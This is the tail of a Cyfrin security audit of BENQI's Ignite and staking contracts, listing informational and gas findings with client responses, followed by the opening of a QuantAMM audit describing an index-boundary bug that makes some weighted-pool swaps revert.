**BENQI:** Acknowledged, there is already a slippage check inside `StakingContract::swapForQI` based on the Chainlink pricing.

**Cyfrin:** Acknowledged.

\clearpage
## Informational


### `AccessControlUpgradeable::_setupRole` is deprecated

**Description:** In [`ValidatorRewarder::initialize`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/ValidatorRewarder.sol#L38-L59) the `DEFAULT_ADMIN_ROLE` is assigned using [`AccessControlUpgradeable::_setupRole`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/ValidatorRewarder.sol#L54):

```solidity
_setupRole(DEFAULT_ADMIN_ROLE, _admin);
```

This method has been deprecated by OpenZeppelin in favor of the `AccessControlUpgradeable::_grantRole` as written in their [documentation](https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl-_setupRole-bytes32-address-) and NatSpec:

```solidity
/**
 * @dev Grants `role` to `account`.
 * ...
 * NOTE: This function is deprecated in favor of {_grantRole}.
 */
function _setupRole(bytes32 role, address account) internal virtual {
    _grantRole(role, account);
}
```

Note that `Ignite::initialize` [also uses this](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L136), but since the contract is already initialized it is of no concern.

**Recommended Mitigation:** Consider using `AccessControlUpgradeable::_grantRole` in `ValidatorRewarder::initialize`, and possibly also in `Ignite::initialize`.

**BENQI:** Fixed in commit [8db7fb5](https://github.com/Benqi-fi/ignite-contracts/commit/8db7fb5d4c27be03aa8c48437a17d9cca3bbc32d).

**Cyfrin:** Verified.


### Unchained initializers should be called instead

**Description:** While not an immediate issue in the current implementation, the direct use of initializer functions rather than their unchained equivalents should be avoided. [`ValidatorRewarder::initialize`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/ValidatorRewarder.sol#L51-L52) and [`StakingContract::initialize`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L259-261) should be modified to avoid [potential duplicate initialization](https://docs.openzeppelin.com/contracts/5.x/upgradeable#multiple-inheritance) in the future.

Note that this is also relevant for [`Ignite::initialize`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L132-134), but since the contract is already initialized it is of no concern.

**Recommended Mitigation:** Consider using unchained initializers in `ValidatorRewarder::initialize`, `StakingContract::initialize`, and possibly also in `Ignite::initialize`.

**BENQI:** Fixed in commit [cd4d43e](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/commit/cd4d43ea8397357b503a127d7ac7966b625a21b7).

**Cyfrin:** Verified. Unchained initializers are now used.


### Missing `onlyInitializing` modifier in `StakingContract`

**Description:** While it is not currently possible for the functions to be invoked elsewhere, both [`StakingContract::initializeRoles`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L152) and [`StakingContract::setInitialParameters`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L185) should be limited to being called during initialization but are missing the `onlyInitializing` modifier. Note that the latter is however handled by its [internal call](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L222-228) to [`StakingContract::_initializePriceFeeds`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L286) that does have it applied.

**Recommended Mitigation:** Consider adding the `onlyInitializing` modifier to `StakingContract::initializeRoles` and possibly also `StakingContract::setInitialParameters`.

**BENQI:** Fixed in commit [cd4d43e](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/commit/cd4d43ea8397357b503a127d7ac7966b625a21b7).

**Cyfrin:** Verified. The modifier has been added.


### Unnecessary `amount` parameter in `StakingContract::stakeWithERC20`

**Description:** When provisioning a node through [`StakingContract::stakeWithERC20`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L513-L577), users can pay with a supported ERC20 token. The [`totalRequiredToken`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L527-530) is calculated based on the [`avaxStakeAmount`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L35) (needed to register the node in Ignite) and the [`hostingFee`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L525) (paid to Zeeve for hosting), before being [transferred](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L534-539) from the user to the contract:

```solidity
require(isTokenAccepted(token), "Token not accepted");
uint256 hostingFee = calculateHostingFee(duration);

uint256 totalRequiredToken = convertAvaxToToken(
    token,
    avaxStakeAmount + hostingFee
);

require(amount >= totalRequiredToken, "Insufficient token");

// Transfer tokens from the user to the contract
IERC20Upgradeable(token).safeTransferFrom(
    msg.sender,
    address(this),
    totalRequiredToken
);
```

The [`amount`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L521) parameter provided by the user is only used to validate that it covers the `totalRequiredToken`, but since execution will revert if the user has not given the contract sufficient allowance for the transfer, the `amount` parameter becomes redundant.

**Recommended Mitigation:** Consider removing the `amount` parameter from `StakingContract::stakeWithERC20`.

**BENQI:** Acknowledged. The purpose is to ensure that the value passed in by the frontend is not lower than the `totalRequiredToken`, acting as a form of slippage check. If its lesser than totalRequiredToken, more tokens could be deducted than the user expected.

**Cyfrin:** Acknowledged.


### Staking amount in QI should be calculated differently

**Description:** Currently, if the stake token is `QI`, `stakingAmountInQi` is [calculated](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L542-544) as shown below:

```solidity
stakingAmountInQi = totalRequiredToken - convertAvaxToToken(token, hostingFee);
```

However, this can result in a precision loss of 1 wei.

**Proof of Concept:** This was tested using a Forge fixture and logs within the source code.

**Recommended Mitigation:** Consider calculating `stakingAmountInQi` directly based on `avaxStakeAmount`.

**BENQI:** Acknowledged. 1 wei precision loss is fine.

**Cyfrin:** Acknowledged.


### Tokens with more than `18` decimals will not be supported

**Description:** Currently, tokens with more than `18` decimals are not supported due to the decimals handling logic in [`StakingContract::_getPriceInUSD`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L953):

```solidity
uint256 decimalDelta = uint256(18) - tokenDecimalDelta;
```

and [`Ignite::registerWithErc20Fee`:](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L299)

```solidity
uint tokenAmount = uint(avaxPrice) * registrationFee / uint(tokenPrice) / 10 ** (18 - token.decimals());
```

**Recommended Mitigation:** Modify this logic if tokens with a larger number of decimals are required to be supported.

**BENQI:** Acknowledged, working as expected.

**Cyfrin:** Acknowledged.


### Incorrect revert strings in `StakingContract::revokeAdminRole`

**Description:** There are two revert strings [[1](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L1021), [2](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L1036)], shown below, in `StakingContract::revokeAdminRole` that appear to have been copied incorrectly and should respectively instead be:
- "Cannot revoke role from the zero address"
- "Attempting to revoke an unrecognized role"

```solidity
function revokeAdminRole(bytes32 role, address account) public {
    // Ensure the account parameter is not a zero address to prevent accidental misassignments
    require(
        account != address(0),
        "Cannot assign role to the zero address"
    );

    /* snip: other conditionals */

    } else {
        // Optionally handle cases where an unknown role is attempted to be granted
        revert("Attempting to grant an unrecognized role");
    }

    /*snip: internal call & event emission */
}
```

**Recommended Mitigation:** Modify the revert strings as suggested.

**BENQI:** Fixed in commits [cd4d43e](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/commit/cd4d43ea8397357b503a127d7ac7966b625a21b7) and [99d7f25](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/commit/99d7f25404a8693f5385d91863b098cd0639bb35).

**Cyfrin:** Verified. The revert strings have been modified.


### Placeholder recipient constants in `Ignite` should be updated before deployment

**Description:** While it is understood that the [`FEE_RECIPIENT`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L43) and [`SLASHED_TOKEN_RECIPIENT`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L44) constants in `Ignite` have been modified for testing purposes, it is important to note that they should be reverted to valid values before deployment to ensure that fees and slashed tokens are not lost.

```solidity
address public constant FEE_RECIPIENT = 0xaAaAaAaaAaAaAaaAaAAAAAAAAaaaAaAaAaaAaaAa; // @audit-info - update placeholder values
address public constant SLASHED_TOKEN_RECIPIENT = 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB;
```

**Recommended Mitigation:** Update the constants before performing the `Ignite` contract upgrade.

**BENQI:** Acknowledged, already in the checklist for deployments.

**Cyfrin:** Acknowledged.


### Missing modifiers

**Description:** Despite the use of OpenZeppelin libraries for re-entrancy guards and pausable functionality, not all external functions have the `nonReentrant` and pausable modifiers applied, so cross-function re-entrancy may be possible and functions could be called when not intended. Specifically:

- [`Ignite::registerWithStake`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L202), unlike other registration functions, is missing the `whenNotPaused` modifier.
- [`Ignite::registerWithPrevalidatedQiStake`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L361) is missing both the `nonReentrant` and `whenNotPaused` modifiers.
-  [`StakingContract::registerNode`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L400), which calls `Ignite::registerWithPrevalidatedQiStake`, does not have the `whenNotPaused` modifier applied either.
- The `whenPaused` and `whenNotPaused` modifiers are not applied to any of the pausable functions in both contracts. This is not strictly required but prescient to note.

**Recommended Mitigation:** Add the necessary modifiers where appropriate.

**BENQI:** The registration functions call `_register()` which enforces pause checks. The `nonReentrant` modifier was not added to `Ignite::registerWithPrevalidatedStake` since it is a permissioned function with no unsafe external calls. The `whenNotPaused` modifier has been added to `StakingContract::registerNode` in commit [4956824](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/commit/4956824ad9703927c1eab68aa9b2e215cf91f62b).

**Cyfrin:** Verified.


### Incorrect assumption that Chainlink price feeds will always have the same decimals

**Description:** There are several instances [[1](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L227), [2](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L299), [3](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L381)] in `Ignite` where the decimal precision of Chainlink price feeds are assumed to be equal. Currently, this does not cause any issues as both `AVAX`, `QI`, and all other `USD` feeds return prices with `8` decimal precision, but this should be handled explicitly as `ETH` feeds return prices with `18` decimal precision as explained [here](https://ethereum.stackexchange.com/questions/92508/do-all-chainlink-feeds-return-prices-with-8-decimals-of-precision).

**Recommended Mitigation:** Consider explicit handling of Chainlink price feed decimals.

**BENQI:** Acknowledged, USD feeds always have eight decimals.

**Cyfrin:** Acknowledged.


### Typo in `Ignite::registerWithPrevalidatedQiStake` NatSpec

**Description:** There is a typo in the `Ignite::registerWithPrevalidatedQiStake` [NatSpec](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L355).

**Recommended Mitigation:**
```diff
  /**
   * @notice Register a new node with a prevalidated QI deposit amount
-  * @param  beneficiary User no whose behalf the registration is made
+  * @param  beneficiary User on whose behalf the registration is made
   * @param  nodeId Node ID of the validator
   * @param  blsProofOfPossession BLS proof of possession (public key + signature)
   * @param  validationDuration Duration of the validation in seconds
   * @param  qiAmount The amount of QI that was staked
  */
```

**BENQI:** Fixed in commit [50c7c1a](https://github.com/Benqi-fi/ignite-contracts/pull/16/commits/50c7c1a81cbe7058116e53d178f61f828993ebc9).

**Cyfrin:** Verified.


### Magic numbers should be replaced by constant variables

**Description:** The magic numbers `10_000`, `2000e18`, `201`/`201e18` are used throughout the `Ignite` contract but should be made constant variables instead.

**Recommended Mitigation:** Use constants in place of the magic numbers outlined above.

**BENQI:** Acknowledged, wont change.

**Cyfrin:** Acknowledged.


### Misalignment of `pause()` and `unpause()` access controls across contracts

**Description:** All three contracts, `Ignite`, `ValidatorRewarder`, and `StakingContract`, have pausing functionality that can be triggered by accounts with special privileges; however, they all implement the access control differently:

- In `Ignite`, [`pause()`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L709-L716) can only be called by accounts granted the `ROLE_PAUSE` role and similarly for [`unpause()`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L718-L725) it is the `ROLE_UNPAUSE` role.

- In `ValidatorRewarder`, both [`pause()`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/ValidatorRewarder.sol#L126-L135) and [`unpause()`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/ValidatorRewarder.sol#L137-L146) can only be called by accounts granted the `ROLE_PAUSE` role. The role `ROLE_UNPAUSE` is [defined](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/ValidatorRewarder.sol#L22) but not used.

- In `StakingContract`, both [`pause()`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L627-L632) and [`unpause()`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L634-L639) are limited to accounts granted the role `DEFAULT_ADMIN_ROLE`.

**Recommended Mitigation:** Consider aligning the role configuration between all contracts, preferably using the `ROLE_PAUSE`/`ROLE_UNPAUSE` setup from `Ignite` as it gives the most flexibility.

**BENQI:** Acknowledged, wont change.

**Cyfrin:** Acknowledged.


### Inconsistent price validation in `Ignite::registerWithStake`

**Description:** In [`Ignite::registerWithErc20Fee`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L294), [`Ignite::registerWithPrevalidatedQiStake`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L376), and [`StakingContract::_getPriceInUSD`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L939-942), prices are validated to be greater than `0`; however, in [`Ignite::registerWithStake`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L221), the `AVAX` price is validated to be greater than the `QI` price. While the `AVAX` price is currently significantly higher than the `QI` price and so will not result in any unwanted reverts, this validation is inconsistent with the other instances and should be modified.

**Recommended Mitigation:** Modify the validation to require the `AVAX` price to be greater than `0` instead of the `QI` price.

**BENQI:** Acknowledged, wont change.

**Cyfrin:** Acknowledged.

\clearpage
## Gas Optimization


### Unnecessary validation of `EnumerableSet` functions

**Description:** When invoking `EnumerableSet::add` and `EnumerableSet::remove`, it is not necessary to first check whether an element [already exists](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/2f0bc58946db746c0d17a2b9d9a8e13f5a8edd7f/contracts/utils/structs/EnumerableSet.sol#L66) within the set as these functions perform the same validation internally. Instead, the return values should be checked.

Instances include: [`StakingContract::addToken`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L579-595), [`StakingContract::removeToken`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L597-610), [`Ignite::addPaymentToken`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L785-L811), and [`Ignite::removePaymentToken`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L813-L830).

**Recommended Mitigation:** Consider the following diff as an example:

```diff
function addToken(
    address token,
    address priceFeedAddress,
    uint256 maxPriceAge
) external onlyRole(BENQI_ADMIN_ROLE) {
-    require(!acceptedTokens.contains(token), "Token already exists");

    _validateAndSetPriceFeed(token, priceFeedAddress, maxPriceAge);
-    acceptedTokens.add(token);
+    require(acceptedTokens.add(token), "Token already exists");
    emit TokenAdded(token);
}
```

**BENQI:** Fixed in commits [4956824](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/commit/4956824ad9703927c1eab68aa9b2e215cf91f62b) and [420ace6](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/commit/420ace61c598ca1fffc97c9d095b3fe0aafedc97).

**Cyfrin:** Verified. The validation has been updated.


### Unnecessary validation in `StakingContract::registerNode`

**Description:** When a new validator node has been created on behalf of a user, the Zeeve admin reports this by calling `StakingContract::registerNode` which performs some validation before invoking `Ignite::registerWithPrevalidatedQiStake` to register the node according to the requirements in `Ignite`.

Some of this validation done in `StakingContract::registerNode`, shown below, is unnecessary and can be removed.

```solidity
require(
    bytes(nodeId).length > 0 && blsProofOfPossession.length > 0,
    "Invalid node or BLS key"
);
require(
    igniteContract.registrationIndicesByNodeId(nodeId) == 0,
    "Node ID already registered"
);
```

All of [this validation](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L406-413) around `nodeId`, `blsProofOfPossesion`, and the registration index is [performed again](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L973-L979) in `Ignite::_register`.

```solidity
// Retrieve the staking details from the stored records
require(stakeRecords[user].stakeCount > 0, "Staking details not found");
require(index < stakeRecords[user].stakeCount, "Index out of bounds"); // Ensures the index is valid

StakeRecord storage record = stakeRecords[user].records[index]; // Access the record by index
```

If [these requirements](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L414-416) were removed, an invalid index or zero stake count would result in an uninitialized `StakeRecord being [returned](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L418). Thus, execution would revert on all of the subsequent requirements:

```solidity
require(record.timestamp != 0, "Staking details not found");
require(isValidDuration(record.duration), "Invalid duration");
// Ensure the staking status is Provisioning
require(
    record.status == StakingStatus.Provisioning,
    "Invalid staking status"
);
```

Even still, the [timestamp validation](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L419) is superfluous as there is no way for an existing record to have an uninitialized `timestamp`, and the record is guaranteed to exist by the subsequent check on [`status`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L422-425). This means that the [`duration`](https://code.zeeve.net/zeeve-endeavors/benqi_smartcontract/-/blob/b63336201f50f9a67451bf5c7b32ddcc4a847ce2/contracts/staking.sol#L420) validation is also unnecessary, as it is not needed to guarantee the existence of a record and is performed again in [`Ignite::_regiserWithChecks`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L930-L936).

**Recommended Mitigation:** Consider removing the unnecessary validation outlined above.

**BENQI:** Acknowledged. Kept as a redundancy check.

**Cyfrin:** Acknowledged.


### Unnecessary conditional block in `Ignite::getTotalRegistrations` can removed

**Description:** The conditional in [`Ignite::getTotalRegistrations`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L483-L494) is intended to handle the case where there are no registrations aside from the default placeholder registration; however, this is unnecessary because the function would still return `0` without this check if the `registrations.length` is `1`, and due to the presence of the default placeholder registration, it should not be possible to reach a state where `registrations.length` is `0`.

```solidity
function getTotalRegistrations() external view returns (uint) {
    if (registrations.length <= 1) {
        return 0;
    }

    // Subtract 1 because the first registration is a dummy registration
    return registrations.length - 1;
}
```

**Recommended Mitigation:** Consider removing the conditional block.

**BENQI:** Fixed in commit [58af671](https://github.com/Benqi-fi/ignite-contracts/pull/16/commits/58af6717bb96410e364f3da3f57a85e7577cac36).

**Cyfrin:** Verified. Validation has been removed.


### Unnecessary validation in `Ignite::getRegistrationsByAccount`

**Description:** In [`Ignite::getRegistrationsByAccount`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L512-L536), there is [validation](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L526-L527) performed on the indices passed as arguments to the function:

```solidity
require(from < to, "From value must be lower than to value");
require(to <= numRegistrations, "To value must be at most equal to the number of registrations");
```

This is not necessary as the call will revert due to underflow [here](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L529) or index out-of-bounds [here](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L532). In the case `to == from`, an empty array would be returned.

**Recommended Mitigation:** Consider removing the validation shown above.

**BENQI:** Fixed in commit [82cf4fc](https://github.com/Benqi-fi/ignite-contracts/pull/16/commits/82cf4fc9f753339460e41bc240a572d89c6fd7a8).

**Cyfrin:** Verified. Validation has been removed.


### Unnecessary price feed address validation in `Ignite::configurePriceFeed`

**Description:** Unlike [`Ignite::addPaymentToken`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L791), which performs no validation on the price feed address itself, and only the data it returns, [`Ignite::configurePriceFeed`](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L838) first [validates](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L844) that the price feed address is not `address(0)`. This is not necessary as the [call](https://github.com/Benqi-fi/ignite-contracts/blob/bbca0ddb399225f378c1d774fb70a7486e655eea/src/Ignite.sol#L856) to `AggregatorV3Interface::latestRoundData` would revert during abi decoding of the return data.

**Proof of Concept:** The following standalone Forge test can be used to demonstrate this:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract TestZeroAddressCall is Test {
    function test_zeroAddressCall() external {
        vm.expectRevert(); // see: https://book.getfoundry.sh/cheatcodes/expect-revert#gotcha:~:text=%E2%9A%A0%EF%B8%8F%20Gotcha%3A%20Usage%20with%20low%2Dlevel%20calls
        (bool revertsAsExpected, bytes memory returnData) =
            address(0).call(abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector));
        assertFalse(revertsAsExpected); // the call itself does not revert

        vm.expectRevert(); // it's the decode step that reverts
        (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
            abi.decode(returnData, (uint80, int256, uint256, uint256, uint80));
    }
}

interface AggregatorV3Interface {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

```

**Recommended Mitigation:** Consider removing the validation.

**BENQI:** Fixed in commit [7cbe588](https://github.com/Benqi-fi/ignite-contracts/pull/16/commits/7cbe58883cad6da79831b83fff96c2fefe348cdb).

**Cyfrin:** Verified. Validation has been removed and the corresponding test has been updated.

\clearpage

------ FILE END car/reports_md/2024-12-11-cyfrin-benqi-ignite-v2.0.md ------


------ FILE START car/reports_md/2024-12-17-cyfrin-quantamm-v1.2.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[immeas](https://twitter.com/0ximmeas)

**Assisting Auditors**



---

# Findings
## High Risk


### Misconfigured index boundaries prevent certain swaps in QuantAMMWeightedPool

**Description:** Balancer pools can handle up to 8 tokens in weighted pools. QuantAMM uses this feature but optimizes storage by using only two slots. As a result, the first four tokens and the last four tokens are treated separately.

For swaps, this logic is implemented in [`QuantAMMWeightedPool::onSwap`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L242-L265):

```solidity
// if both tokens are within the first storage element
if (request.indexIn < 4 && request.indexOut < 4) {
    QuantAMMNormalisedTokenPair memory tokenWeights = _getNormalisedWeightPair(
        request.indexIn,
        request.indexOut,
        timeSinceLastUpdate,
        totalTokens
    );
    tokenInWeight = tokenWeights.firstTokenWeight;
    tokenOutWeight = tokenWeights.secondTokenWeight;
} else if (request.indexIn > 4 && request.indexOut < 4) {
    // if the tokens are in different storage elements
    QuantAMMNormalisedTokenPair memory tokenWeights = _getNormalisedWeightPair(
        request.indexOut,
        request.indexIn,
        timeSinceLastUpdate,
        totalTokens
    );
    tokenInWeight = tokenWeights.firstTokenWeight;
    tokenOutWeight = tokenWeights.secondTokenWeight;
} else {
    tokenInWeight = _getNormalizedWeight(request.indexIn, timeSinceLastUpdate, totalTokens);
    tokenOutWeight = _getNormalizedWeight(request.indexOut, timeSinceLastUpdate, totalTokens);
}
```

The issue arises in the second `else if` block, which is intended to handle cases where both tokens are in the second slot. However, the condition `request.indexOut < 4` is incorrect; it should be `request.indexOut >= 4`. Consequently, in [`_getNormalisedWeightPair`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L305-L325), the code will revert:

```solidity
function _getNormalisedWeightPair(
    uint256 tokenIndexOne, // @audit indexOut
    uint256 tokenIndexTwo, // @audit indexIn
    // ...
) internal view virtual returns (QuantAMMNormalisedTokenPair memory) {
    uint256 firstTokenIndex = tokenIndexOne; // @audit indexOut
    uint256 secondTokenIndex = tokenIndexTwo; // @audit indexIn
    // ...
    if (tokenIndexTwo > 4) { // @audit indexIn will always be > 4 from the branch above
        firstTokenIndex = tokenIndexOne - 4; // @audit indexOut, must be < 4 hence underflow
        secondTokenIndex = tokenIndexTwo - 4;
        totalTokensInPacked -= 4;
        targetWrappedToken = _normalizedSecondFourWeights;
    } else {
```

Here, `tokenIndexOne - 4` will underflow due to the incorrect condition.

In [`QuantAMMWeightedPool::_getNormalizedWeight`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L370-L404), there is a similar issue where the condition `tokenIndex > 4` should be `tokenIndex >= 4`:

```solidity
if (tokenIndex > 4) { // @audit should be >=
    // get the index in the second storage element
    index = tokenIndex - 4;
    targetWrappedToken = _normalizedSecondFourWeights;
    tokenIndexInPacked -= 4;
} else {
    // @audit first slot
    if (totalTokens > 4) {
         tokenIndexInPacked = 4;
    }
    targetWrappedToken = _normalizedFirstFourWeights;
```

This causes a failure when fetching the multiplier in [`QuantAMMWeightedPool::_calculateCurrentBlockWeight`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L352-L368):

```solidity
int256 blockMultiplier = tokenWeights[tokenIndex + (tokensInTokenWeights)];
```

In this case, `tokenWeights` contains 8 entries, but `tokenIndex + (tokensInTokenWeights)` equals 8, causing an array out-of-bounds error.

The same issue is also present in the following locations, though they currently have no impact:

- In [`QuantAMMWeightedPool::onSwap`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L252):
  ```solidity
  } else if (request.indexIn > 4 && request.indexOut < 4) { // @audit should be >=
  ```

